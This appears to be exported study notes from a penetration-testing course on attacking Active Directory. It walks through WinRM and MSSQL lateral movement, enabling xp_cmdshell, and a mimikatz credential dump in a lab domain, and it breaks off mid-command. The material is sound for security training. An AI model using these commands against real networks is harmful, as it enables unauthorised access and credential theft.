ACADEMY-EA-MS01\nGroupName    : Remote Management Users\nMemberName   : INLANEFREIGHT\\forend\nSID          : S-1-5-21-3842939050-3880317879-2865463114-5614\nIsGroup      : False\nIsDomain     : UNKNOWN\n```\n\nWe can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.\n\nCode: cypher\n\n```cypher\nMATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2\n```\n\n#### Using the Cypher Query in BloodHound\n\n![BloodHound graph showing connection from FOREND@INLANEFREIGHT.LOCAL to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanPSRemote.](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)\n\nWe could also add this as a custom query to our BloodHound installation, so it's always available to us.\n\n#### Adding the Cypher Query as a Custom Query in BloodHound\n\n![Interface for creating a custom query to find WinRM users with dangerous rights.](https://academy.hackthebox.com/storage/modules/143/user_defined_query.png)\n\nWe can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.\n\n#### Establishing WinRM Session from Windows\n\nPrivileged Access\n\n```powershell-session\nPS C:\\htb> $password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\nPS C:\\htb> $cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\nPS C:\\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred\n\n[ACADEMY-EA-MS01]: PS C:\\Users\\forend\\Documents> hostname\nACADEMY-EA-MS01\n[ACADEMY-EA-MS01]: PS C:\\Users\\forend\\Documents> Exit-PSSession\nPS C:\\htb> \n```\n\nFrom our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.\n\nTo use `evil-winrm` we can install it using the following command:\n\n#### Installing Evil-WinRM\n\nPrivileged Access\n\n```shell-session\ndrxh3kr@htb[/htb]$ gem install evil-winrm\n```\n\nTyping `evil-winrm` will give us the help menu and all of the available commands.\n\n#### Viewing Evil-WinRM's Help Menu\n\nPrivileged Access\n\n```shell-session\ndrxh3kr@htb[/htb]$ evil-winrm \n\nEvil-WinRM shell v3.3\n\nError: missing argument: ip, user\n\nUsage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]\n    -S, --ssl                        Enable ssl\n    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate\n    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate\n    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }\n    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path\n        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)\n    -e, --executables EXES_PATH      C# executables local path\n    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)\n    -U, --url URL                    Remote url endpoint (default /wsman)\n    -u, --user USER                  Username (required if not using kerberos)\n    -p, --password PASS              Password\n    -H, --hash HASH                  NTHash\n    -P, --port PORT                  Remote host port (default 5985)\n    -V, --version                    Show version\n    -n, --no-colors                  Disable colors\n    -N, --no-rpath-completion        Disable remote path completion\n    -l, --log                        Log the WinRM session\n    -h, --help                       Display this help message\n```\n\nWe can connect with just an IP address and valid credentials.\n\n#### Connecting to a Target with Evil-WinRM and Valid Credentials\n\nPrivileged Access\n\n```shell-session\ndrxh3kr@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend\n\nEnter Password: \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\forend.INLANEFREIGHT\\Documents> hostname\nACADEMY-EA-MS01\n```\n\nFrom here, we could dig around to plan our next move.\n\n---\n\n## SQL Server Admin\n\nMore often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.\n\nBloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:\n\nCode: cypher\n\n```cypher\nMATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2\n```\n\nHere we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EA-DB01`.\n\n#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound\n\n![Graph showing SQLAdmin connection from ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL to DAMUNDSEN@INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)\n\nWe can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.\n\nFirst, let's hunt for SQL server instances.\n\n#### Enumerating MSSQL Instances with PowerUpSQL\n\nPrivileged Access\n\n```powershell-session\nPS C:\\htb> cd .\\PowerUpSQL\\\nPS C:\\htb>  Import-Module .\\PowerUpSQL.ps1\nPS C:\\htb>  Get-SQLInstanceDomain\n\nComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL\nInstance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433\nDomainAccountSid : 1500000521000170152142291832437223174127203170152400\nDomainAccount    : damundsen\nDomainAccountCn  : Dana Amundsen\nService          : MSSQLSvc\nSpn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433\nLastLogon        : 4/6/2022 11:59 AM\n```\n\nWe could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.\n\nPrivileged Access\n\n```powershell-session\nPS C:\\htb>  Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n\nVERBOSE: 172.16.5.150,1433 : Connection Success.\n\nColumn1\n-------\nMicrosoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...\n```\n\nWe can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.\n\n#### Displaying mssqlclient.py Options\n\nPrivileged Access\n\n```shell-session\ndrxh3kr@htb[/htb]$ mssqlclient.py \n\nImpacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation\n\nusage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]\n                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]\n                      target\n\nTDS client implementation (SSL supported).\n\npositional arguments:\n  target                [[domain/]username[:password]@]<targetName or address>\n\n<SNIP>\n```\n\n#### Running mssqlclient.py Against the Target\n\nPrivileged Access\n\n```shell-session\ndrxh3kr@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) \n[!] Press help for extra shell commands\n```\n\nOnce connected, we could type `help` to see what commands are available to us.\n\n#### Viewing our Options with Access to the SQL Server\n\nPrivileged Access\n\n```shell-session\nSQL> help\n\n     lcd {path}                 - changes the current local directory to {path}\n     exit                       - terminates the server process (and this session)\n     enable_xp_cmdshell         - you know what it means\n     disable_xp_cmdshell        - you know what it means\n     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell\n     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)\n     ! {cmd}                    - executes a local shell cmd\n```\n\nWe could then choose `enable_xp_cmdshell` to enable the [xp_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.\n\n#### Choosing enable_xp_cmdshell\n\nPrivileged Access\n\n```shell-session\nSQL> enable_xp_cmdshell\n\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n```\n\nFinally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate and SeAssignPrimaryToken` of the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module. Try them out on this target if you would like to practice further!\n\n#### Enumerating our Rights on the System using xp_cmdshell\n\nPrivileged Access\n\n```shell-session\nxp_cmdshell whoami /priv\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nNULL                                                                               \n\nPRIVILEGES INFORMATION                                                             \n\n----------------------                                                             \n\nNULL                                                                               \n\nPrivilege Name                Description                               State      \n\n============================= ========================================= ========   \n\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   \n\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   \n\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    \n\nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    \n\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled    \n\nSeCreateGlobalPrivilege       Create global objects                     Enabled    \n\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   \n\nNULL                                                               \n```\n\n---\n\n## Moving On\n\nThis section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.\n\nFinally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.\n\nThe following section will address a common issue we often run into when using WinRM to connect to hosts in the network.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/25-Kerberos \"Double Hop\" Problem",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/25-Kerberos \"Double Hop\" Problem.md",
    "title": "25 Kerberos \"Double Hop\" Problem",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- There's an issue known as the \"Double Hop\" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are grant...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nThere's an issue known as the \"Double Hop\" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a \"ticket\" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.\n\n---\n\n## Background\n\nThe \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.\n\nThe crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.\n\nLet's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the `backupadm` user in memory.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\nPS C:\\htb> PS C:\\Users\\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm\n[DEV01]: PS C:\\Users\\backupadm\\Documents> cd 'C:\\Users\\Public\\'\n[DEV01]: PS C:\\Users\\Public> .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 45177 (00000000:0000b079)\nSession           : Interactive from 1\nUser Name         : UMFD-1\nDomain            : Font Driver Host\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:32 PM\nSID               : S-1-5-96-0-1\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 1284107 (00000000:0013980b)\nSession           : Interactive from 1\nUser Name         : srvadmin\nDomain            : INLANEFREIGHT\nLogon Server      : DC01\nLogon Time        : 6/28/2022 3:46:05 PM\nSID               : S-1-5-21-1666128402-2659679066-1433032234-1107\n        msv :\n         [00000003] Primary\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT\n         * NTLM     : cf3a5525ee9414229e66279623ed5c58\n         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2\n         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce\n        tspkg :\n        wdigest :\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 70669 (00000000:0001140d)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:33 PM\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 45178 (00000000:0000b07a)\nSession           : Interactive from 0\nUser Name         : UMFD-0\nDomain            : Font Driver Host\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:32 PM\nSID               : S-1-5-96-0-0\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 44190 (00000000:0000ac9e)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:32 PM\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : DEV01$\nDomain            : INLANEFREIGHT\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:32 PM\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 1284140 (00000000:0013982c)\nSession           : Interactive from 1\nUser Name         : srvadmin\nDomain            : INLANEFREIGHT\nLogon Server      : DC01\nLogon Time        : 6/28/2022 3:46:05 PM\nSID               : S-1-5-21-1666128402-2659679066-1433032234-1107\n        msv :\n         [00000003] Primary\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT\n         * NTLM     : cf3a5525ee9414229e66279623ed5c58\n         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2\n         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce\n        tspkg :\n        wdigest :\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : srvadmin\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 70647 (00000000:000113f7)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:33 PM\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9\n        ssp :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nUser Name         : DEV01$\nDomain            : INLANEFREIGHT\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:32 PM\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33\n         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f\n        tspkg :\n        wdigest :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT\n         * Password : (null)\n        kerberos :\n         * Username : DEV01$\n         * Domain   : INLANEFREIGHT.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 6/28/2022 3:33:33 PM\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nmimikatz(commandline) # exit\nBye!\n```\n\nThere are indeed processes running in the context of the `backupadm` user, such as `wsmprovhost.exe`, which is the process that spawns when a Windows Remote PowerShell session is spawned.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\n[DEV01]: PS C:\\Users\\Public> tasklist /V |findstr backupadm\nwsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\\backupadm\n                             0:00:03 N/A\ntasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\\backupadm\n                             0:00:00 N/A\nconhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\\backupadm\n                             0:00:00 N/A\n```\n\nIn the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.\n\nLet's say we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the `Remote Management Users` group on DEV01. We want to use `PowerView` to enumerate the domain, which requires communication with the Domain Controller, DC01.\n\n![Diagram showing attack path: Attack Host to Dev01 (First Hop), then to DC01 (Second Hop).](https://academy.hackthebox.com/storage/modules/143/double_hop.png)\n\nWhen we connect to `DEV01` using a tool such as `evil-winrm`, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as `PowerView` and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.\n\nIf unconstrained delegation is enabled on a server, it is likely we won't face the \"Double Hop\" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.\n\n---\n\n## Workarounds\n\nA few workarounds for the double-hop issue are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a \"nested\" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an `evil-winrm` session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)\n\n---\n\n## Workaround #1: PSCredential Object\n\nWe can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.\n\nAfter connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.\n\nKerberos \"Double Hop\" Problem\n\n```shell-session\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> import-module 